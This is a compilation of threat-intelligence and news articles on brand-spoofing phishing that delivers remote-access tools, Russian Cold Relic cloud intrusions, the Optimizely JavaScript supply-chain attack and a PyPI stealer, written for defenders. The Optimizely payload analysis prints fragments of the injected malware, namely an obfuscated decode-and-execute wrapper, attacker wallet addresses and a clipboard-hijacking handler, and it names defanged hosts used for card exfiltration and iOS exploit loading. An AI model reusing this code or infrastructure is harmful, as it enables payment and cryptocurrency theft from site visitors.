Title: Betrayed Expectations: Malware Delivery via Common Brands
Context: By: Jacob Malimban, Intelligence Team In the first half of 2026, Cofense Intelligence observed a 239% rise in phishing campaigns that weaponize brand names to deliver malware...
Full Text:
By: Jacob Malimban, Intelligence Team

In the first half of 2026, Cofense Intelligence observed a 239% rise in phishing campaigns that weaponize brand names to deliver malware onto corporate devices as compared to the first half of 2025. Adobe, the Social Security Administration, Docusign, the IRS, and Zoom are among the most abused. The names are familiar by design: employees who expect a routine document from a recognized sender appear more likely to click, and the borrowed credibility of those brands helps the emails slip past automated security filters. There are two primary ways that brands can be spoofed to deliver malware and abused legitimate remote access tools (RATs).

The first is the initial phishing email. The brand spoofed in the email is what sets the expectation for the context of the campaign. For example, threat actors have used lures such as a refund sent by the IRS (Figure 5) and a benefits-themed document sent by the Social Security Administration (Figure 3). When a victim expects a file but does not realize the sender is malicious, they are likely to click on a phishing link.

The second way a brand can be abused is through the filename. To trick victims, malware may be named “Social_Security_Administration_v02.4_EN_US.msi” (Figure 3) or “setup_Zoom.msi” (Figure 6), depending on the brand used in the phishing email. These malware files are often hosted on cloud services like Google or Amazon, which can bypass the organization’s security controls.

What makes this threat category particularly difficult to manage is that the tools being delivered are not traditional malware. ConnectWise RAT, Datto RMM, SimpleHelp, and similar products are the same software that many IT departments use for legitimate remote support. Threat actors favor them precisely because standard security systems are built to trust them.

Key Points

In the first half of this year, 18% of all malware delivery campaigns impersonated new brands not seen before.

Adobe is the most abused brand when delivering malware in the first half of 2026.

The malware downloaded usually has a filename matching the phishing email branding, like “Adobe software update.msi”.

Threat actors often abuse legitimate cloud services like Google or Amazon to distribute malware and bypass security controls.

94% of campaigns delivering malware abuse legitimate remote access tools (RATs).

Brand Campaign Volume

Malware delivering campaigns increased 239% in the first half of 2026 compared to the first half of 2025.

The top five brands account for around 24% of all malware delivery campaign volume in the first half of this year.

Figure 1: The relative proportion of brands spoofed in the first half of 2026.

In the first half of 2026, Cofense Intelligence identified brands like Adobe, Social Security Administration, Docusign, IRS, and Zoom being abused in malware delivery campaigns. Docusign and Adobe are part of normal organizational operations. These brands follow the trends first identified in 2021. Social Security Administration-spoofing and IRS-spoofing after April mark the trend of government themed phishing outside of the IRS tax season. Zoom has typically been abused to host documents with links to credential phishing pages—and rarely links to malware pages.

Adobe Spoofing Campaigns Delivering Malware

Adobe-spoofing phishing campaigns rank #1 by volume in the first half of 2026.

Adobe-spoofing phishing emails delivering malware experienced an 18-fold increase when compared to the first half of 2025.

Adobe-spoofing campaigns typically deliver ConnectWise RAT (44%), Datto RMM (16%), and GoTo RAT (7%).

These software are technically legitimate remote access tools (RATs) but can be abused by threat actors to gain unauthorized administrative access.

Figure 2: Adobe-spoofing website claiming a software update is necessary (ATR 415874).

In credential phishing, Adobe has been used to host documents with links to malicious websites. Typically, PDFs with shortened links or QR codes obfuscate the credential phishing pages. In Adobe-spoofing campaigns delivering malware, the email usually claims a document is available to view.

After clicking on the phishing link and attempting to download the document, a website opens. The malicious website typically claims that Adobe Reader is out of date, and an update is necessary to see the PDF. Installing the file will deliver a legitimate RAT controlled by the threat actor. In these Adobe software update phishing campaigns, threat actors like to abuse tools such as ConnectWise’s ScreenConnect (ConnectWise RAT) and Datto RMM to take over the victim machine. For example, Figure 2 shows one website that claims Adobe Reader is out of date and downloads malware. Indicators of compromise (IOCs) for Figure 2 are listed in Active Threat Report (ATR) 415874. ATRs contain the context for each threat actor campaign, allowing current and similar campaigns to be blocked.

Social Security Administration Spoofing Campaigns Delivering Malware

Social Security Administration-spoofing is the second highest by campaign volume.

Campaign volume in the first half of 2025 is roughly equivalent to volume in the first half of 2026.

SSA-spoofing typically delivers ConnectWise RAT (55%), SimpleHelp (12%), and Faronics Deploy (9%).

Figure 3: Social Security Administration-spoofing email that bypasses email security technology to deliver ConnectWise RAT (ATR 417484).

In the United States, the Social Security Administration (SSA) becomes an important consideration near retirement age (at least age 62). For eligible members of the workforce, this pension information can dictate the lifestyle one lives after employment ends. Previous campaign iterations in Q4 2024 prioritized urgency and consequences when phishing. Current SSA-spoofing emails usually claim to provide information rather than demand it. Figure 3 shows an SSA download statement phishing email, one of the scams the SSA Office of the Inspector General warns about.

If the phishing link is clicked, an SSA-spoofing website typically opens, and a file download starts. The file appears similar to those in the Docusign and Adobe sections. Some files act like benefit letters or document notifications. Others require a download file to be run because “Adobe Reader is out of date”. As usual, running the file will install a threat actor-controlled legitimate RAT. The RATs most commonly installed are ConnectWise RAT and SimpleHelp. The SSA-impersonation campaign delivering ConnectWise RAT has been going on since at least 2024.

Docusign Spoofing Campaigns Delivering Malware

Docusign-spoofing emails increased about 250% when comparing the first half of 2026 to the first half of 2025.

Docusign-spoofing campaigns typically deliver ConnectWise RAT (34%), GoTo RAT (11%), Itarian RAT (5%), or some combination of the three.

Figure 4: Docusign-spoofing file is a SuperOps RMM instance abused by the threat actor (ATR 415883).

Docusign is typically used by threat actors to host documents with links to redirect to malicious websites, usually Microsoft-spoofing credential phishing pages. This is because using trusted websites help bypass email security technologies, and abusing legitimate business tools helps malicious content mimic benign content. Docusign-branded emails are also useful for getting recipients to download fake documents. Downloading the fake document will deliver malware instead of the expected file.

Threat actors will typically use the Docusign style for the email, the malware download website, and the filename. As seen in Figure 4, a malicious file is named like a Docusign attachment. Threat actors like to deliver legitimate RATs that they control, like ConnectWise RAT and GoTo RAT.

IRS Spoofing Campaigns Delivering Malware

IRS-spoofing email volume experienced a 10-fold increase when comparing the first half of 2026 to the first half of 2025.

IRS-spoofing campaigns typically deliver ConnectWise RAT (50%), Tiflux RAT (13%), Splashtop (13%) or some combination of the three.

Figure 5: IRS-spoofing, tax refund-themed phishing campaign delivering ConnectWise RAT (ATR 415954).

In the first half of 2025, IRS-spoofing campaigns delivering malware were most prevalent before the USA tax filing date on April 15. Now in the first half of 2026, threat actors continue to use the IRS brand in phishing emails past the tax filing deadline but with many themed about late filing deadlines. Well-developed phishing lures used after April 15 include a refund that has been processed or a tax filing extension being made available. As threat actors use current topics like Elon Musk and DOGE offering an IRS tax refund, IRS-spoofing campaigns are expected to increase.

As with the general rise in threat-actor abused legitimate RATs, IRS-spoofing campaigns deliver similar malware in most cases. ConnectWise RAT is once again the most popular RAT to be abused in IRS-spoofing campaigns. There is also a multi-stage campaign where Tiflux RAT is first installed, then Tiflux RAT installs Splashtop and an UltraVNC utility. In earlier group-delivered malware campaigns, the malware was primarily purpose-built for threat actors and entirely malicious. In the case of Tiflux RAT and Splashtop, both are developed by legitimate organizations for IT operations. Unfortunately, the instances of Tiflux RAT and Splashtop delivered in these campaigns are controlled by threat actors.

Zoom Spoofing Campaigns Delivering Malware

Zoom-spoofing emails delivering malware increased over 100% when comparing the first half of 2026 to the first half of 2025.

Zoom-spoofing campaigns typically deliver ConnectWise RAT (29%), TrustConnect (14%), and Atera (7%).

Figure 6: A fake Zoom website that downloads an abused RAT (ATR 416603).

Legitimate Zoom links can prompt users to download the Zoom app to access the meeting. Threat actors frequently spoof Zoom and hijack this expected behavior to trick users into downloading malware instead.

Zoom-spoofing phishing emails match the format of legitimate Zoom meeting emails, but the links will redirect to a malware download page instead of the legitimate Zoom site. The most prominent malware delivered is ConnectWise RAT again. TrustConnect and Atera are similar RATs abused by threat actors and delivered in Zoom-spoofing campaigns. Figure 6 shows a malicious Atera instance being downloaded from a threat actor’s website.

Problems Caused by Legitimate Remote Access Tool Abuse

As legitimate RATs are developed for enterprise use, abuse of these tools by threat actors may hide in plain sight.

ConnectWise RAT is currently the most abused legitimate RAT, instead of NetSupport Manager RAT.

When used for their intended purpose, legitimate remote access tools can reduce costs and improve efficiency. With legitimate RATs, IT professionals can easily maintain and monitor various devices across the organization without needing physical access to it. This elevated privilege becomes problematic when threat actors gain access to it.

Legitimate RATs are just as capable of purpose-built malware in the hands of a threat actor. With PowerShell commands, additional malware payloads can be installed after the initial RAT infection. Threat actors have used ConnectWise RAT to deliver ransomware before.

Organizations can find it hard to identify and contain legitimate RATs used by threat actors. Threat actors may even use the same RATs the organization uses, making context, continuous monitoring, and mitigative controls especially important. If the organization successfully contains one type of RAT, threat actors can easily use a different legitimate RAT for infections. In each of the brands spoofed in this report, threat actors already abuse various legitimate RATs.

Conclusions

This report shows five prominent brands spoofed by threat actors. Some key insights include malicious content nearly indistinguishable from legitimate brands, and the increasing abuse of legitimate remote administrative tools. These tactics by the threat actors can make it harder for both users and security analysts to determine if something is legitimate or not. Especially noteworthy are IRS-spoofing and Social Security Administration-spoofing phishing emails. IRS-spoofing emails will likely continue to increase even outside of tax filing season. Social Security Administration-spoofing emails already are not limited by a specific season.

Page Break

Mitigations

Establish and enforce a software allowlist for remote access tools. Any remote access tool not on that list, including ConnectWise, SimpleHelp, Atera, and GoTo RAT, should be blocked from installing on corporate devices. Organizations that do not have an allowlist should at minimum block the digital certificates associated with remote access tools they do not use.

Update employee security awareness training to reflect current lure themes, specifically Adobe document requests, SSA benefit notices, IRS refund emails, and Zoom meeting invitations. Employees who have been trained on real, current threats are more likely to pause before clicking. Simulation exercises should use these exact scenarios, not outdated generic examples.

Blocking remote access tools and updating training are essential, but threat actors will keep finding new brands, filenames, and legitimate tools to abuse. Organizations need a way to respond quickly when a campaign reaches the inbox or an endpoint. Title: The Next Cyberattack Won’t Wait. Are You Ready?
Context: On November 17, CISA urged organizations to patch a critical Oracle Java vulnerability
Full Text:
One day into the November Microsoft outage, Cofense Intelligence saw phishing emails posing as service notifications. The outage was real. The emails were designed to steal sign-in credentials. We published our findings on November 16. On November 17, CISA urged organizations to patch a critical Oracle Java vulnerability. Security teams should act on the patch guidance and keep email defenses running while they address it.

Read our November 16 Flash Alert · Read CISA’s November 17 alert

One campaign can look like many

The FBI has warned that criminals use generative AI to make scams more convincing and easier to scale. In polymorphic phishing, different versions of the same campaign can land in different inboxes. AI can help attackers produce more of those variants. Even modern filters can miss a message that’s been designed to evade AI algorithms.

For a security team, the work starts when the first report comes in. Removing that one message protects the person who reported it. Finding the other versions can protect employees who received a similar email and haven’t flagged it. That’s why teams need a way to investigate across inboxes.

Why AI alone isn’t enough

AI is essential to modern security. It processes volume and speed that no team could match by hand. But AI struggles with threats that don’t match previous patterns, and new lures are exactly what attackers are producing. Human analysts close that gap. They judge intent and context, and they respond to what automation hasn’t learned yet. Reports from employees and customers feed back into protection, so one organization’s report can help protect many others.

In one recent case, a brand-new lure got past several automated systems, including AI-based ones. Employees at a Cofense Phishing Defense Center customer reported the lure, in turn giving Cofense analysts the opportunity to protect all of our customers from this threat. Speed and human judgment working together made the difference. Cofense has seen a 22% growth from 2025 to 2026 so far in non-Microsoft related branding being used in phishing attacks as AI allows Threat Actors to expand upon the types of threats they are able to create. Depending on the industry, between 39% and 49% of phishing subject lines included the recipient’s name or other personal details. It is becoming increasingly easy for threat actors to use AI to harvest employee information and use it in phishing campaigns.

Find the campaign and remove it

Say one employee reports a fake service alert. Start with that email, then check whether other inboxes received related versions. AI helps group similar messages for analyst review. An analyst confirms which emails are malicious so the team can remove them, including copies nobody reported. That’s the difference between closing one report and removing the campaign.

See how Cofense Vision AI connects related messages

What organizations can do now

Walk through the steps below with the people who own email security, IT, and incident response. Start by checking who can remove a confirmed phish from multiple inboxes and how your team will coordinate if email is down.

Have Cyber Security solutions that are able to be flexible in the everchanging landscape of cybercrime and AI. You should have human resources working in tandem with supervised AI to ensure that you aren't left waiting for AI security models to catch up.

Map out alternative communication strategies for when you lose access to email or messaging platforms.

Have and verify backups for all important company data.

Ensure your internal Phishing Training programs are properly training your employees based on real life threats and targets weaknesses in your user base.

Document clear lines of communication. Employees should know who to contact when verifying a request or transaction. They should also know which backup channels to use if they suspect the original source has been compromised.

Don’t rely on a single layer of defense. No filter catches everything and attackers design campaigns to bypass them. Pair your automated security tools with detection and response to ensure that someone is finding what is slipping through.

Treat legitimate remote access tools with the utmost scrutiny. Attackers often abuse legitimate remote monitoring and remote management (RMM) tools, such as ConnectWise/ScreenConnect, because those tools blend in with normal IT activity. Block any RMM or remote access software your organization doesn't officially use and closely monitor the ones you do.

Patch with vetted updates. Apply tested patches for every known vulnerability. Prioritize anything actively exploited or facing the internet, like VPNs, firewalls, and remote access appliances.

Shrink your attack surface. Review and remove old or unused accounts, services, appliances, and applications. Anything you don't need is just one more way in.

Flag external email clearly. Use clear banners to warn users when a message comes from outside the organization. That simple visual cue helps users spot business email compromise (BEC) and impersonation attempts.

Title: Russian COLD RELIC Hackers Use Stolen Google Workspace Data to Breach Second U.S. Organization
Context: Attacks mounted by the threat actor have successfully compromised high-value targets, including government officials, defense contractors, and non-governmental organizations...
Full Text:
The Russia-linked cyber espionage group known as Cold Relic (formerly COLDRIVER and UNC4057) has been observed weaponizing a single cloud compromise into a launchpad for a series of linked intrusions resulting in third-party compromise.

Google's Mandiant and Threat Intelligence Group (GTIG) said it investigated a 2026 compromise at a U.S.-based organization in which the adversary leveraged data, the corporate staff directory, and identities harvested from an earlier attack on another U.S.-based entity in late 2025.

Cold Relic, also tracked as Callisto, Gossamer Bear, and Star Blizzard, has a track record of orchestrating sophisticated phishing and malware campaigns to gain access information that may be of strategic importance to the Russian government.

The access is abused to register rogue multi-factor authentication (MFA) devices, passkeys, and MFA backup codes to establish long-term persistence and then conduct aggressive data collection and exfiltration operations targeting email, chat, and cloud storage repositories. In addition, the compromised access is used to target the victim's social and professional networks.

Attacks mounted by the threat actor have successfully compromised high-value targets, including government officials, defense contractors, and non-governmental organizations (NGOs) across Europe and North America.

"Once Cold Relic compromises a target, it uses stolen emails and data to establish authentic pretexts and impersonate contacts when reaching out to subsequent targets," Google said.

According to the tech giant's cybersecurity and incident response teams, Cold Relic compromised the cloud productivity environment of an unspecified U.S.-based organization in late 2025. Initial access to the network was achieved by means of a residential proxy network located in close geographical proximity to the victim.

Using the stolen credentials of a Super Admin account and combining it with an MFA push notification fatigue attack, the threat actor is said to have gained access to the account after the victim accepted an MFA request. This was followed by the attacker registering their own device within the tenant to retain access. The threat actor was also observed using passkeys and MFA backup codes as alternate access mechanisms.

"Cold Relic used the privileges of the compromised Super Admin account to download the contents of the entire organization's cloud storage drive by both mass sharing files to a Cold Relic-operated email account and downloading files directly," Google explained.

"While operating inside the tenant of the victim organization, Cold Relic accessed the Admin Console, queried Admin security investigation and email audit logs to check defensive visibility, and viewed, modified, and deleted Alert Center notifications to remove forensic evidence of the initial intrusion."

These actions ultimately enabled the threat actor to export full employee lists and domain-wide data via the Google Takeout service using the Super Admin privileges. Following mass data theft, the attackers continued to maintain access over several months and perform additional activities -

Sync email inbox via OAuth to external email clients.

Re-authenticate using unrevoked attacker-enrolled passkeys that persisted across password and session resets and bypassed device registration controls.

Target cloud drive document access related to credentials, email archives, personnel information, and other documents of interest.

Even after the attackers were ousted from the victim organization, Google said it observed Cold Relic using email accounts impersonating employees of the victim organization to target both internal employees and associates within the same professional circles as part of a renewed social engineering campaign.

The attack then moved to the next phase when the threat actor compromised a Microsoft Entra ID user account of a second U.S.-based organization that used Entra ID as its federated single sign-on (SSO) identity provider for Google Workspace.

By impersonating an employee at the first organization, the threat actor established communications with the target over a secure messaging app and then shared phishing links designed to harvest credentials and authentication tokens for Entra ID under the pretext of sharing a document containing details about a technical issue.

"Upon successful authentication using the stolen credentials, Cold Relic registered and used a new MFA device in the SSO solution to retain access to the user account throughout the intrusion," Google said.

"By impersonating someone known in the same professional circles as the new target, Cold Relic increased their chance of phishing success. Ultimately, in this case, Cold Relic was able to obtain credentials to the organization and perform bulk download of files accessible in the compromised user's cloud drive."

Upon successfully compromising the second organization, the messaging app account used to initiate the conversation had its profile name changed to a different persona. It's suspected that the new persona was likely used to target other organizations in the same professional network.

"Cold Relic's campaigns demonstrate the convergence of human-centric social engineering and cloud identity abuse," Google said. "By obtaining access to strategic personnel rosters and operational documents, Russian intelligence services turn legitimate business communications into attack vectors against trusted partners."

Title: Attackers Used Optimizely to A/B Test Malware on Top Websites
Context: At least 178 top web destinations unwittingly served a variety of malware exploits against visitors over the past 24 hours thanks to a security vulnerability involving...
Full Text:
At least 178 top web destinations unwittingly served a variety of malware exploits against visitors over the past 24 hours thanks to a security vulnerability involving Optimizely, a company that helps websites customize user experiences and test out new features. Experts say the incident, which saw data-stealing malicious software silently injected into sites like the BBC, CNN, Equifax, Ledger and Zoom, was exacerbated by the reality that few popular websites enforce strict rules on the sources of third-party content.

The Zoom.com homepage loading the malicious JavaScript file from Optimizely. Image: blog.report-uri.com. Click to enlarge.

According to a blog post from the security firm Report URI, on November 16 malicious JavaScript code was served to visitors of 178 organizations through Optimizely’s platform. Report URI researcher Scott Helme wrote that the payload delivered by the malicious Javascript was rebuilt 26 times during the day, dropping a multi-purpose malware kit that could steal payment card data, cookies and screenshots, and swap any cryptocurrency payment addresses for the attacker’s.

Helme noted the affected websites also served exploit code custom made to attack known vulnerabilities in older Apple iPhone and iPad devices. Known by such names as “DarkSword” and “Coruna,” these are zero-click exploit kits that chain together a half-dozen security holes to seize complete control over outdated devices and extract data.

“The important lesson here is that trusted JavaScript doesn’t always remain trustworthy,” Helme wrote. “A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.”

Contacted for comment, Optimizely said that on November 16, 2026 it “identified a security incident in which an unauthorized party exploited a vulnerability in the Optimizely Experimentation to add malicious JavaScript to some customer projects.”

“We acted swiftly to contain the incident and have fully remediated the identified vulnerability,” reads a written statement shared by Optimizely. “These measures included blocking access to the vulnerable path, deploying a fix, removing the injected code from affected projects, ending active sessions, revoking tokens, and resetting access for affected user accounts. We have also implemented additional protections to prevent malicious code from being delivered in Cloudflare. While the incident has been fully remediated, we are working with third-party experts on a comprehensive investigation.”

Many top web properties no longer fully display content unless visitors agree to let often dozens of third parties serve JavaScript, a powerful web scripting language that enables interactive content. JavaScript code is run on the user’s device, and it can read information displayed in the user’s browser and even modify a website’s appearance or content.

One reason JavaScript is so heavily used is that it enables fairly precise browser fingerprinting and other ways of tracking visitors and clicks. According to the 2025 Web Almanac by HTTP Archive, the median homepage loads at least 22 JavaScript files. But as the incident with Optimizely shows, a compromise at a third-party vendor’s website can quickly snowball into a supply chain attack against downstream websites that end up serving visitors tampered and malicious JavaScript files.

Zach Edwards is a researcher at Infoblox and the co-founder of the ad-tracking service DecryptAds. Edwards said Optimizely is a vendor which often collects data outside of consent flows, with their JavaScript snippets being embedded as close to the top of the page as possible to ensure that it’s one of the first things to render, which is important since the product is primarily built for A/B testing.

“So to make the product work as expected, this code is setup to fire immediately on-page load, and not restrict rendering behind a consent dialog box,” he said. “This means that this supply chain attack didn’t require any clicking or consent to trigger — most of the impacted clients would immediately serve up the payload as soon as someone loaded the page, further increasing risks from this type of JavaScript snippet being compromised.”

Websites can minimize the chances that a breach at a third-party content provider spirals into a supply chain attack by taking full advantage of “Content Security Policies” or CSPs, which specify the domain names that are allowed to serve third-party content. But Edwards said most websites — apart from perhaps the largest e-commerce, social media and financial platforms — don’t even bother with CSPs, or else tend to leave them overly permissive for marketing reasons.

“With literally all websites which embed 3rd party JavaScript resources, if you don’t have a content security policy then if any of those partners get compromised, new domains can be injected into your website via JavaScript which won’t be stopped,” he said. “We’re in the age of JavaScript supply chain attacks and yet almost no one is talking about why content security policies were invented and how this is largely the solution for operators, even though it’s not always simple to get it initially deployed.”

How broadly deployed were CSPs at the websites impacted by the Optimizely attack? According to Report URI, 68 of the sites had no CSP at all, while 50 of them had a CSP that still allowed the malware payload and the data theft. The company found only 24 of the affected sites (15 percent) had CSPs that fully blocked the malicious payload.

Image: blog.report-uri.com.

The overall deployment of CSPs across the Web’s busiest sites is somewhat lower — about 10 percent — according to Helme’s site crawler.ninja, which scans the top million websites daily for security issues. Helme said he hopes this incident will encourage more sites to adopt effective CSPs, noting that it could have been far worse: By Report URI’s estimates, the purveyors of this malware attack managed to steal only around $7,500 worth of virtual currency from affected users, as well as an unknown number of payment card records.

Helme said he often compares the current widespread lack of CSPs to the Wild West.

“Organizations are running all this code, but they don’t know what it’s doing,” Helme said in an interview with KrebsOnSecurity. “This is why we keep seeing such large scale breaches in places [where] there are no checks and rules in place on the code we’re running, so this was kind of inevitable. Once an attacker gets to the point of running code on your site, the question is what do they want to do with that and can they write the script to do it. Now with AI that’s not a problem anymore.”

Internet users can control the JavaScript elements allowed to run on webpages by using simple script-blocking plugins like NoScript. But these tools have always only been effective for diehard security and privacy nerds who are willing to put up with sifting through dozens of JavaScript requests on each new website.

Happily, modern ad blocking software can handily block most third-party JavaScript requests. Ten years ago, the standard security advice for end users was to install antivirus and enable a firewall. These days, your ad/script blocker is your firewall. We explored several options and approaches to blocking ads in our August 2026 story, Who’s Tracking You?

Title: Optimizely confirms massive cyberattack on customer websites injected stealer malware
Context: ” The attacks were discovered by UK-based security researcher Scott Helme, the founder of Report URI, who said in an interview that his team had confirmed 178 victims, but that...
Full Text:
Attackers apparently from China used an authentication security hole within the popular Optimizely AI platform for marketers to steal from at least 178 sites owned by some of the planet’s largest companies.

Named victims featured vendors including Zoom, Paychex, Equifax, and GitLab, and end-user enterprises including Starbucks, IKEA, Mattel, American Eagle, Air France, Mutual of Omaha, Heineken, Home Chef, Cinnabon, American Eagle, Levi, Costco and HSBC.

Salesforce issued a statement confirming that it had also been impacted by the attack.

“Salesforce is investigating unauthorized modifications to scripts provided by Optimizely and used on certain Salesforce websites,” it wrote in an email statement. “As a precaution, Salesforce is confirming that Optimizely scripts are disabled across preview and production instances.”

The attacks were discovered by UK-based security researcher Scott Helme, the founder of Report URI, who said in an interview that his team had confirmed 178 victims, but that there could be more. “That’s the number that we directly observed and that all carried the same infection,” he said.

Helme published a report about the attacks on Monday, in which he described an attack methodology where an Optimizely capability in its Web Experimentation product facilitating adding members to a site’s development team was leveraged to insert malware into the sites.

“The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker’s, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the Coruna and DarkSword iOS exploit kits,” Helme wrote. “The important lesson here is that trusted JavaScript doesn’t always remain trustworthy. A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.”

Optimizely customers load a JavaScript “snippet” from Optimizely’s CDN onto their sites which contains Optimizely code, the customer’s A/B tests, and an optional field called Project JavaScript containing custom code written by the customer. The report said that attackers inserted their own code into the customer’s Project JavaScript and left the rest of each snippet untouched. “The file was still served from cdn[.]Optimizely[.]com, with Optimizely’s certificate, from a host that every affected site already trusted,” it noted.

The report described how the observed attack worked. “The script watches form submissions and every fetch/XHR POST for a card number, expiry date and CVV,” it said. “When it has all three, it sends them to https://1688360[.]cc/card[.]php with navigator.sendBeacon. Cards entered in hosted payment iframes [such as] Stripe, Adyen and similar were out of its reach. Cards typed into a site’s own form fields were not.”

Analyst questions the claims of a fix

Optimizely, which did not reply to an interview request, confirmed the attacks on its site. In an email shared with customers, Optimizely said that attackers “exploited a vulnerability in the Experimentation account signup flow. They used it to impersonate a user and add malicious JavaScript to some customer projects. We have blocked access to the vulnerable path and deployed a fix.”

The email also said that the company had “ended active sessions and revoked tokens and reset access for affected user accounts” and that it also had “removed the injected code from affected projects” and “blocked any code from being delivered in Cloudflare.”

The company used highly confident wording to describe its fix, saying that “the Optimizely Experimentation platform is fully secured” and that “modification of Javascript no longer possible.”

Frank Dickson, principal analyst at Dickson Research, raised an eyebrow at those claims.

To begin with, he noted a discrepancy in the timelines published by the vendor and the security researcher. “Optimizely puts the first malicious write at 07:51. Report URI saw the BBC’s Optimizely snippet loading attacker code at 04:21, three and a half hours earlier,” he said. “The forensics report should reconcile that gap. Customers need the real start time to scope their exposure.”

As well, he pointed out, “Optimizely seems very comfortable stating absolutes early in a forensics investigation. Those are verdicts from a company whose forensics are still underway and whose timeline disagrees with outside research.”

No responsibility for the attack claimed

Helme speculated in an interview that the attackers were a small group of thieves, almost certainly coming from China, noting that he saw extensive Chinese writing in the code and that the attacks “tie back to infrastructure that has been used by other Chinese actors.”

“They are either Chinese or they really want us to think that they are Chinese,” Helme said, adding that the nature of what was stolen makes it highly unlikely the attackers were state actors. State actors, he said, would likely have used the malware on major news sites to create and spread false stories.

Asked if his team could verify Optimizely’s claim that it had fixed the hole, he said that he couldn’t yet. Some of the infected sites were cleaned up, but he has to wait to see if they get reinfected before concluding that the original hole had been closed.

Recommendation to customers ‘concerning’

Dickson said that one line in Optimizely’s email to customers was especially concerning.

“Optimizely’s documentation tells customers to allow ‘unsafe-eval‘ in their policy. At HSBC, the policy blocked the main payload and the data theft, but a backup copy of the malicious code ran anyway through that setting. A vendor’s setup guide should not quietly loosen its customers’ defenses,” Dickson said. “Restrict script-src to the hosts a page actually needs. Lock down connect-src so stolen data has nowhere to go. Drop ‘unsafe-eval‘ wherever possible. Start in report-only mode so nothing breaks.”

He added, “the Optimizely attack may be about as bad as a third-party script compromise gets. Optimizely owes its customers a clear explanation of how one flaw reached so many unrelated companies.”

Title: Optimizely Supply Chain Attack Distributes Malware Across Global Brands
Context: An attacker exploited a vulnerability in Optimizely's Web Experimentation platform on November 16, 2026, distributing malicious JavaScript through websites operated by some of...
Full Text:
An attacker exploited a vulnerability in Optimizely's Web Experimentation platform on November 16, 2026, distributing malicious JavaScript through websites operated by some of the world's largest brands. Security researcher Scott Helme of Report URI identified 188 infected JavaScript snippets associated with 178 organizations, including the BBC, CNN, Zoom, GitLab, IKEA, and HSBC. The attack exposed website visitors to malware designed to replace cryptocurrency wallet addresses, steal payment information, and deliver iOS exploit kits.

Optimizely Web Experimentation is used for A/B testing and website personalization. Organizations using the service embed JavaScript snippets from Optimizely's content delivery network into their websites. These snippets include an optional Project JavaScript field that allows custom code to execute across pages. The attacker inserted malicious code into that field, which was then served through Optimizely's trusted infrastructure. The affected organizations did not need to have their own websites or servers compromised for the malicious scripts to reach visitors.

Optimizely confirmed that the attacker exploited a vulnerability in its Experimentation account signup flow. The company says it patched the vulnerability, removed the injected code, revoked tokens, reset access for affected accounts, and notified the organizations involved. Report URI subsequently confirmed that all infected snippets in its observed set had been cleaned by November 16 at 23:11 UTC.

Payload Analysis #

Affected snippets could load track.js from an attacker-controlled domain. StepSecurity also documented variants that hid the URL in base64 or carried the payload inline.

Affected website └── Optimizely customer snippet └── injected JavaScript └── 1688360[.]cc/track.js ├── cryptocurrency address clipper └── iOS boot.js loader

A copy of track.js from 1688360[.]cc was captured by the Internet Archive’s Wayback Machine on 16 November at 08:08:15 UTC. We decoded the sample statically; we did not execute it.

The capture timestamp precedes the 08:10 UTC first-build time reported in the published timeline. The Internet Archive’s index records the capture at 08:08:15 UTC, and its digest matches the compressed response we downloaded. The relationship between this capture and the 26 reported builds remains unconfirmed.

Size: 19,513 bytes SHA-256: 1ec4245b3b303304ea24a89b3b2351b0f0c085087050f517d23dcba9694c165a

The sample contains two encoded modules: a wallet clipper and an iOS loader. Static inspection did not identify the card-skimming module described in later versions.

Payload encoding

The outer file stores JavaScript modules in a configuration object. Each module’s code is a reversed base64 string. At runtime, the wrapper reverses the string, decodes it with atob(), and executes the decoded text using new Function():

(new Function( atob(encoded.split("").reverse().join("")) ))();

The sample’s decoded modules are 8,501 bytes and 312 bytes respectively.

Wallet clipper

The first module contains hard-coded Ethereum-style, Tron and Bitcoin replacement addresses:

var E = '0xC4026b06D82b0F0B363eda0642D61CfbDc17884e', T = 'THvs6p56XkUiMkJeSc51cAP64u2RsTYqxa', B = '19g9rZcPeiz8rUvyWpTRyXXhPnjsWrc3kW';

It looks for matching addresses and replaces them using this function:

function F(s) { if (!s || s.length < 26 || !TS.test(s)) return s; return s.replace(RX, function (m) { var r = V(m); return r && r !== m ? r : m; }); }

The code validates Bitcoin and Tron candidates using checksum logic. For Ethereum-style candidates, it checks the 0x prefix and 40 hexadecimal characters; it does not perform an Ethereum checksum validation.

The clipper scans page text, inputs and textareas. It intercepts copy events and wraps the Clipboard API’s readText() and writeText() methods. A MutationObserver and a 50 ms interval help it revisit changing page content.

During a user-initiated copy, this handler can replace the copied text without a separate permission prompt. It does not read the clipboard’s previous contents; the wrapped Clipboard API methods remain subject to browser restrictions:

D.addEventListener('copy', function (e) { var t = ''; try { t = String(W.getSelection() || ''); } catch (x) {} if (!t || !TS.test(t)) return; var o = F(t); if (o !== t && e.clipboardData) { e.clipboardData.setData('text/plain', o); e.preventDefault(); } }, true);

iOS loader

The second module is restricted by the outer configuration to devices classified as iOS. It creates a script element that loads boot.js from 5vobauua3ojpklx[.]icu and sets:

data-channel-code="02111110" data-cfasync="false"

The Optimizely compromise shows how a single vulnerability in a widely used third-party service can expose visitors across hundreds of websites to malicious code. Third-party scripts can interact with sensitive page content and user activity, often with the same privileges as the website's own code. Organizations should reconsider whether experimentation and personalization scripts need to run across their entire sites, particularly on payment, account, and other sensitive pages.

Title: We caught the agent-framework PyPI compromise six minutes after it published
Context: site URL | About 30 minutes after the first malicious package was published, the threat actor pushed a new version (1
Full Text:
The compromise, and how we detected it

Microsoft’s Agent Framework is an open-source, multi-language framework used to build and orchestrate AI agents within the Microsoft Azure ecosystem. The compromised package is the meta-package, a thin wrapper used to pull in the different framework dependencies. The agent-framework averages 196,000 downloads a month across all versions. If versions 1.26.1 or 1.26.2 touched a build agent or a laptop, assume every secret on that host is gone, and pin back to 1.26.0.

agent-framework 1.26.1 went live on PyPI at 20:35 UTC on November 17, 2026. Our supply-chain monitor flagged it as malicious at 20:41 UTC, and we published the details that evening. Version 1.26.2 followed at 21:08 UTC with the same stealer under new filenames. PyPI removed both within the hour.

